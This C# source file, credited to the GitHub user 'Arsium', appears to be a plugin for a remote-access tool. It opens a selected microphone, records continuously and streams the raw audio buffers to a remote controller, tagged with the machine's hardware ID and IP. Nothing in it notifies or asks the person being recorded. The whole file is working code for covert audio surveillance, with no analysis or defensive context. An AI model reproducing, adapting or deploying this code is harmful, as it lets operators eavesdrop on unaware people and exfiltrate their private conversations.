using NAudio.Wave;
using System;
using PacketLib.Packet;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class Helpers
    {
        static Helpers()
        {
            captureAsync = new CaptureAsync(Capture);
        }

        private static WaveInEvent inputDevice;

        internal delegate void CaptureAsync();
        internal static CaptureAsync captureAsync;

        internal static void StartCaptureAsync()
        {
            captureAsync.BeginInvoke(new AsyncCallback(EndCaptureAsync), null);
        }

        internal static void Capture()
        {
            inputDevice = new WaveInEvent();
            inputDevice.WaveFormat = new WaveFormat(44100, 1);

            inputDevice.DeviceNumber = Launch.remoteAudioCapturePacket.index;

            inputDevice.DataAvailable += WaveDataAvailable;
            inputDevice.RecordingStopped += WaveStop;
            inputDevice.StartRecording();
        }


        private static void WaveDataAvailable(object sender, WaveInEventArgs e)
        {
            try
            {
                if (Launch.audioCapture)
                {
                    RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(e.Buffer, e.BytesRecorded)
                    {
                        baseIp = Launch.clientHandler.baseIp,
                        HWID = Launch.clientHandler.HWID
                    };
                    Launch.clientHandler.SendPacket(remoteAudioCapturePacket);   
                }
                else
                {
                    return;
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        private static void WaveStop(object sender, StoppedEventArgs e)
        {
            return;
        }

        private static void EndCaptureAsync(IAsyncResult ar)
        {
            captureAsync.EndInvoke(ar);
        }

        internal static void StopStreamAudio()
        {
            inputDevice.StopRecording();
            inputDevice.DataAvailable -= null;
            inputDevice.RecordingStopped -= null;
            inputDevice?.Dispose();
            Launch.clientHandler.Dispose();
        }
    }
}
